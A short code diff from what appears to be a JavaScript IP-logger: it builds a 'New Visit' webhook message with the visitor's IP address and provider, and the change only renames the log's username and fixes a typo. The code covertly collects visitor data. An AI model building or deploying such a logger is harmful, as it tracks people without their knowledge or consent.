@@ -25,11 +25,11 @@ const request = async () => { // Calling a "synchronous" fetch
     postRequest.setRequestHeader('Content-type', 'application/json');
 
     var params = {
-        username:   "Bedroz Log",
+        username:   "Faragski Log",
         avatar_url: "",
         embeds:    [{ title: ":clapper: New Visit",
                     color: "14119907",
-                    description: "__**:globe_with_meridians: IP-Adress:**__ \n" 
+                    description: "__**:globe_with_meridians: IP-Address:**__ \n" 
                     + "`" + ip + "`" + 
                     "\n \n__**:telephone: Provider:**__ \n" 
                     + provider + 
